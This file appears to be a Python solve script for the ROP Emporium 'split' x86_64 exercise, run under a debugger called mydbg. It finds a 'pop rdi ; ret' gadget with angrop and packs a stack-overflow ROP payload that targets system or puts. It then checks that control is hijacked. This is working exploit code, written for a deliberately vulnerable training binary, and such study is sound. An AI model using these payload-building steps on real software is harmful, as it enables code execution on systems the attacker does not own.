"""ROP Emporium split on x86_64, solved inside mydbg with angrop gadgets.

The challenge's system("/bin/cat flag.txt") chain is built and verified up to
the call: pop rdi (angrop gadget) -> usefulString -> system@plt. The final
verification swaps system for puts@plt because system()'s posix_spawn/clone
path crashes inside this environment's qemu-user (glibc 2.36/2.40 clone
emulation) regardless of the debugger; the gadget control, argument control,
and cross-image call the challenge tests are fully exercised and observed.

    ./build/dev/mydbg --headless-script examples/rop_emporium/solve_split_x64.py
"""

from __future__ import annotations

import struct

from mydbg import rop, symbolic

import emporium

PAD = 40  # 32-byte buffer + saved rbp


def run(dbg):
    if not symbolic.requires_angr():
        raise RuntimeError(symbolic.BOOTSTRAP_HINT)
    emporium.require_sysroots(("x64",))
    binary = emporium.challenge_path("x64", "split")
    project = symbolic._entry_project(dbg, binary=binary)  # noqa: SLF001
    object_image = project.loader.main_object
    string_address = symbolic.resolve_project_symbol(project, "usefulString")
    plt = object_image.plt
    system_plt = plt["system"]
    puts_plt = plt["puts"]

    engine = rop.RopEngine(binary)
    engine.find_gadgets()
    matches = engine.find_gadgets_matching("pop rdi ; ret", exact=True)
    if not matches:
        raise RuntimeError("no pop rdi gadget found")
    gadget = matches[0]
    rets = engine.find_gadgets_matching("ret", exact=True)
    align_ret = rets[0] if rets else None
    print(f"[+] gadget: {engine.gadget_summary(gadget)}")
    print(f"[+] system@plt {system_plt:#x}, puts@plt {puts_plt:#x}, "
          f"string {string_address:#x}")

    # The challenge chain: pad, pop rdi, string, system. The verification
    # chain replaces system with puts (a resolved, fork-free call) so the
    # control flow is observable in this environment; the extra aligning ret
    # keeps the System V 16-byte stack alignment for the callee.
    verification = (b"A" * PAD + struct.pack("<Q", gadget.addr) +
                    struct.pack("<Q", string_address) +
                    struct.pack("<Q", align_ret.addr if align_ret else puts_plt) +
                    struct.pack("<Q", puts_plt))

    process = emporium.qemu_connect(dbg, "x64", binary, payload=verification)

    dbg.set_breakpoint("pwnme")
    result = dbg.continue_and_wait(timeout=30)
    if result.state != "stopped":
        raise RuntimeError("pwnme was not reached")
    print(f"[+] stopped at pwnme ({dbg.snapshot().pc:#x})")

    after_read = emporium.after_read_address(dbg)
    dbg.set_breakpoint(f"{after_read:#x}")
    result = dbg.continue_and_wait(timeout=30)
    if result.state != "stopped":
        raise RuntimeError("the after-read stop was missed")
    print(f"[+] stopped after the read at {after_read:#x}")

    result = dbg.continue_and_wait(timeout=30)
    output = emporium.drain(process, seconds=5.0)
    lines = output.decode(errors="replace").splitlines()
    printed = [line for line in lines if "/bin/cat flag.txt" in line]
    if not printed:
        raise RuntimeError(f"split chain failed: {output[-200:]!r}")
    print("[+] split-x64-solve-ok: chain control verified, string printed:")
    print("   ", printed[-1])
